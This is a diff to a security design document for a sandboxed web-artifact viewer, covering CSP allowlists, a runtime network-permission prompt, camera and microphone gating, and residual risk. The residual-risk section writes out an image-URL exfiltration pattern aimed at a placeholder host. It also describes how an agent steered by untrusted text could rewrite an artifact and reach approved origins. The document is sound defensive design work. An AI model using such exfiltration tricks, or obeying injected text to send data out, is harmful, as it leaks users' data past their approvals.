@@ -586,12 +586,120 @@ Points of stance embedded in that policy:
   never runs — an indefinite "Loading…" with nothing to debug (av-x01o).
 - **A no-network artifact gets `connect-src 'none'`.** Nothing is reachable by
   default.
+- **An allowlist entry is an origin, and that is enforced at the single write
+  path** (av-i7hd). `POST`/`PATCH /api/artifacts` normalize every entry through
+  `origin.NormalizeOrigin` — absolute `https://host[:port]` (plaintext `http://`
+  only for loopback), lowercased, trailing host dot stripped, default port
+  dropped, userinfo/path/query/fragment refused — and reject anything else with
+  a `400` naming the value. It belongs there rather than in a client because
+  these strings are pasted verbatim into the header above: a path-bearing entry
+  is path-matched by CSP (so it means something other than what the approval UI
+  showed), a keyword or `data:`/`blob:` source is the CSP builder's to emit and
+  never the user's to type, and near-duplicate spellings of one host would split
+  a single decision into several rows. The store applies the same rule as an
+  invariant, so no future caller can reintroduce a non-origin row.
 - **The ingest scan is transparency, not enforcement.** It parses the document
   with a real HTML tokenizer and surfaces the origins the artifact references,
   but its output **never seeds the allowlist** — only origins the user explicitly
   approves are written. A runtime attempt to reach anything else is blocked by
-  the browser; the user can approve the origin afterward in the artifact's
-  allowlist editor, which updates the CSP on next render.
+  the browser and then surfaced by the runtime prompt below.
+
+### 2.1 The runtime permission prompt (av-kmwj)
+
+The CSP has already blocked the request by the time anyone is asked about it.
+The prompt widens the policy for the *next* load; it never rescues a request in
+flight, and nothing about it is an enforcement point. What it fixes is the
+silence: before it, an artifact that reached an unapproved origin simply failed,
+with the explanation available only in a browser console the audience for this
+product does not open.
+
+The render preamble listens for `securitypolicyviolation` in the artifact frame
+and posts the blocked origin to the **host frame**; the dialog renders in app
+chrome, because the artifact controls its own DOM and could draw a convincing
+forgery there. Three answers:
+
+- **Allow** writes a `decision='allow'` row and reloads the frame. A CSP is a
+  response header fixed at load, so a widened policy needs a new document; the
+  host makes that transparent by reassigning the frame's `src` — through the
+  app origin's `/artifacts/:id/open`, which mints a render token at request
+  time, since the token baked into the original `src` expires (av-c5aq).
+- **Block once** dismisses. The next load asks again.
+- **Don't ask again** writes a `decision='block'` row. Block rows never widen
+  the CSP; they are inlined into the render preamble purely so that origin
+  stops being reported. They stay visible and reversible on the edit page —
+  Allow overrides one, Forget deletes it — so the answer is never a one-way
+  trap.
+
+Five properties of the reporter are load-bearing:
+
+- **It reports only what the allowlist can fix.** A violation of a directive
+  built from the allowlist (`script-src` and its `-elem`/`-attr` variants,
+  `worker-src`, `style-src`, `img-src`, `font-src`, `media-src`, `connect-src`,
+  `form-action`) is actionable. One outside that set is not: an `<iframe>`
+  blocked by `default-src 'none'` would be blocked identically after the user
+  approved its origin, so prompting there would promise a fix that never
+  arrives.
+- **An origin the policy already permits is a redirect, and is never
+  prompted for.** CSP re-checks every hop of a redirect, so a request to an
+  allowlisted host that 302s somewhere else is blocked at the second hop —
+  and the violation report names the URL the artifact *asked for*, not the
+  one it was sent to, because a policy must not become a way to probe where a
+  cross-origin redirect leads. The reporter therefore sees an origin that is
+  already allowed. Offering to allow it again is worse than saying nothing:
+  the grant is a no-op, the request fails identically on reload, and Allow
+  reloads the frame, which re-fires the violation and re-opens the prompt.
+  That loop is why the reporter is inlined with the CSP's own origins
+  (`ALLOWED_ORIGINS`) and diverts this case to the capability banner
+  (`redirected-origin`), which explains what happened and says the
+  destination has to be added by name. `picsum.photos` serving images from
+  `fastly.picsum.photos` is the canonical example. The banner is where this
+  case currently *ends*, which is not good enough — the visitor is told what
+  broke and given no way to fix it short of already knowing the destination
+  host. Giving it a real path is av-jnfh, which also records why the frame
+  cannot resolve the redirect itself: the opaque response filter, not our
+  sandbox and not our CSP, reports `redirected: false` for a request that was.
+- **Each origin is reported once per load**, so a request in a retry loop
+  cannot spam the host. The same set that enforces this is seeded with the
+  artifact's refused origins, which is why a "don't ask again" answer is quiet
+  rather than merely dismissed.
+- **It is framed-only and never anonymous.** A top-level render and a share
+  have no trusted app chrome to host a prompt, so violations there stay
+  silently blocked; a widget frame omits the reporter along with the rest of
+  the capability bridges. A public instance's unauthenticated visitor cannot
+  record either answer, so they are not asked — the same reasoning that stops
+  the storage shim writing through for them (av-wmp6).
+- **Decisions go through `POST/DELETE /api/artifacts/:id/origins`, one origin
+  at a time.** `PATCH` carries the whole allow set, and a prompt that restated
+  it would clobber decisions made elsewhere since its page loaded — and could
+  express neither a block nor a return to undecided. An **agent session cannot
+  reach this route at all**: `agentSubResources` is a deny-by-default
+  allowlist, and a session steered by text Exhibit did not author must not
+  approve its own network egress.
+
+**Where the prompt is, and is not.**
+
+- **The detail page** hosts it. The frame is sandboxed and the page around it
+  is ours, which is the whole precondition.
+- **A top-level render and a share do not, by design.** `/a/:id` opened
+  directly is a real-origin document whose only DOM belongs to the artifact,
+  so a prompt drawn there would be a prompt the artifact could forge — and
+  there is no host frame to post the report to in the first place. The entire
+  bridge half of the preamble is framed-only for this reason. Violations
+  there stay blocked and silent, and the devtools Network panel is where the
+  blocked request and its redirect chain are visible at all. Whether silence
+  is the right answer, or whether a non-deciding notice pointing back at
+  app-origin chrome would be worth the habit it teaches, is av-tan0.
+- **The agent chat page hosts it too** (av-6xvs). Its preview pane is on the
+  app origin under our own template with the artifact in the same sandboxed
+  cross-origin frame, which is the whole precondition — it simply had none of
+  the prompt, so an artifact reaching an unapproved origin while being built
+  there failed silently. Both pages now install one module
+  (`network-prompt.js`) over one dialog partial, so a later fix to either
+  cannot land on one surface and miss the other. Its remaining gap is the
+  *other* bridges: downloads, clipboard, external links and
+  camera/microphone are still absent there, and each is a distinct capability
+  with its own approval, so they belong together in one piece of work rather
+  than arriving one at a time.
 
 ## 3. Vendoring: snapshot on import, never live-linked
 
@@ -625,7 +733,7 @@ After ingest the stored copy never phones home. Updating it is an explicit user
 action (`POST /api/artifacts/:id/refetch`). There are no live-linked imports and
 no automatic refresh.
 
-## 4. Local I/O defaults: clipboard and files
+## 4. Local I/O defaults: clipboard, files, and capture devices
 
 **Render preamble taxonomy** (canonical vocabulary for all docs). The JS
 injected into the rendered frame as the first `<head>` script(s) — replacing
@@ -640,8 +748,15 @@ are four families:
   over a separate, purely in-memory cache**, never persisted and never sent
   anywhere — see §1.2.
 - **Capability bridge** — re-grants a capability the sandbox *denied*
-  (clipboard, downloads) by proxying the op to the trusted host under
-  first-use approval. Not persistence. This section.
+  (clipboard, downloads, external links) by proxying the op to the trusted host
+  under first-use approval. Not persistence. This section.
+- **Capability gate** — for a capability the sandbox denies and the host
+  *cannot re-grant either* (camera/microphone, av-mv3k). It captures the same
+  per-artifact first-use decision a bridge does, then settles the call with the
+  failure the artifact would have seen anyway and points at the context where
+  the decision can be spent. Worth its own name precisely because it is the one
+  member of the family that must not be read as re-granting anything: the
+  decision it records is enforced elsewhere (a response header), not here.
 - **Polyfill** — reconstructs an API *absent* in this environment (e.g. File
   System Access pickers, deferred as av-70t9) atop available primitives.
 - **Compatibility shim** — re-implements an operation the browser nominally
@@ -755,6 +870,60 @@ is allowed; anything that produces egress or bypasses a user decision is not.**
     new tab" already reaches the same URL from browser chrome, which the
     sandbox does not govern. Like downloads, the bridge installs only when a
     host frame exists; top-level renders and share pages navigate natively.
+- **Camera and microphone** — approved per device, per artifact
+  (`camera_approved`, `microphone_approved`), and the one capability in this
+  section that is **decided but not delivered in the frame**. Both halves of
+  that sentence are measured facts, not policy preferences:
+  - **The frame cannot reach a device.** `getUserMedia` from the sandbox's
+    opaque origin throws `SecurityError: Invalid security origin` before any
+    permission is consulted. An `allow="camera; microphone"` delegation does not
+    change it — Chrome still refuses with its auto-accept flag set, so the
+    refusal is structural rather than a prompt outcome — which is the same no-op
+    the clipboard delegation turned out to be.
+  - **The host cannot hand one in.** The download bridge's trick is "acquire on
+    the app origin, transfer the payload into the frame", and there is nothing
+    to transfer: a camera `MediaStreamTrack` is not a transferable object in any
+    shipping engine. `postMessage` with one in the transfer list throws
+    `DataCloneError` — to a cross-origin frame, to a same-origin frame, and even
+    to a Worker.
+  - **So the frame's `getUserMedia` is a gate, not a bridge.** It posts the
+    devices its constraints named to the host and then *settles* — rejecting
+    with a `DOMException`, never hanging on a stream that is not coming. On
+    first use the host prompts, naming exactly those devices and saying plainly
+    that a preview cannot provide one; **Allow** persists only the devices
+    asked for and opens the artifact's top-level render, where it works. Once
+    approved, a later request in the preview raises the §1.1 capability banner
+    instead of prompting again.
+  - **The top-level render is enforced, per artifact.** The other three bridges
+    are framed-only because a top-level render is a page the user navigated to
+    and the browser's own controls govern it. That reasoning fails here, because
+    a device permission is granted to an *origin* and one render origin serves
+    the whole library: a visitor who allowed the camera for one artifact opened
+    directly would have allowed it for **every** artifact on that origin, with
+    no per-artifact decision anywhere. So the render document carries a
+    per-artifact `Permissions-Policy: camera=…, microphone=…` built from the same
+    two approvals. `camera=()` is refused by the browser *even when the origin's
+    permission is already granted* — verified against a browser holding that
+    grant. One decision, honored in both contexts.
+  - The consequence is deliberate: an artifact that was never approved cannot
+    reach a device anywhere, including opened directly, and the way to grant one
+    is the artifact's security settings or the host prompt — not the browser's
+    address-bar permission, which cannot tell two artifacts apart.
+  - **Shares** carry the owner's approvals, since a share publishes the artifact
+    as its owner sees it; the visitor's own browser prompt is still the gate on
+    their hardware. **Widgets carry neither**, whatever their artifact holds: a
+    tile renders unattended behind `pointer-events: none`, where there is no
+    gesture to attribute a device prompt to.
+  - The header names camera and microphone and nothing else, so every other
+    Permissions-Policy feature keeps its browser default rather than turning
+    this into a second policy surface beside the CSP.
+  - **Not attempted: synthesizing a stream.** The frame could be fed video
+    frames (`ImageBitmap` → canvas → `captureStream`) and PCM (an
+    `AudioContext` destination) to produce a `MediaStream` object in the
+    preview. That would be a picture of a device, not a device: no real
+    constraints, no `applyConstraints`, no `getSettings`, and a `stop()` that
+    reaches no hardware. It is a rendering feature, and it belongs to its own
+    ticket rather than smuggled in behind a permission one.
 
 ## 5. The agent sidecar: an API client driven by untrusted text
 
@@ -888,16 +1057,17 @@ user opened. What that costs, and what it does not:
   re-renders on every save.
 - It cannot reach another artifact, the library listing, the provider key, or a
   share link: none of those is in the credential's scope.
-- It is *wrong*, not *exfiltrating* — so long as a rewritten body cannot
-  silently inherit the artifact's prior network approvals. Closing that channel
-  is `av-hrtv`; until it lands, an agent-written body keeps the approved
-  origins of the body it replaced.
+- It is *wrong*, not *exfiltrating* in a way this scoping alone prevents: an
+  agent-written body keeps the artifact's approved network origins, by design —
+  approval attaches to the artifact, not to a version of its body (`av-hrtv`).
+  §6 states why re-gating on a rewrite is rejected and what actually bounds the
+  risk.
 - Artifact bodies have no version history (`av-1rvm`), so an overwrite is not
   yet undoable.
 
 ## 6. Residual risk
 
-Accepted, with eyes open (see the PRD §6.3): the model controls what an artifact
+Accepted, with eyes open (see the PRD §6.4): the model controls what an artifact
 *reaches*, not what it *displays* — a malicious artifact can still render
 convincing fake UI. The isolation in §1 caps the blast radius (no real session to
 steal). Auth today is a single static bearer token scoped for single-user,
@@ -913,3 +1083,24 @@ at debug level — the raw query, but never headers, so it was never a channel
 for a header-borne credential either way. An operator's reverse proxy is
 outside that guarantee: if its access log is configured to record request
 headers, the `Authorization` header must be redacted there.
+
+**An approved origin outlives the code it was approved for.** Approval is
+recorded per (artifact, origin) and never per version of the body, so an origin
+on an artifact's allowlist stays reachable by whatever that artifact later
+contains — including a body an agent rewrote. This is deliberate: users approve
+*origins*, not code, and running unreviewed code safely is the whole purpose of
+the sandbox (§1). Re-gating on a body change would be code review by another
+name — it would fire on every agent edit, since the agent tools always save
+whole documents — and it would be noisy on benign edits while blind on hostile
+ones: the CSP applies one flat allowlist to every directive, so "this origin
+moved from a script import to a fetch" is no change in capability; exfiltration
+needs no `connect-src` at all (`<img src="https://X/?d=…">` carries the payload
+in the URL); and the scan is deliberately evadable by a URL constructed at
+runtime. What bounds the damage is the origin decision itself and what is
+reachable inside the sandbox at all, not post-hoc inspection of the body. What
+the agent path does owe the user is *visibility*: every save reports the origins
+the new body references that are not yet approved, so a newly introduced origin
+gets the same explicit decision an ingest would (av-hrtv). If a real control is
+ever wanted here it is per-directive allowlists — approve an origin for
+`script-src` only, so a fetch to it is browser-blocked regardless of any scan —
+which is enforcement rather than marking, and a separate, larger change.
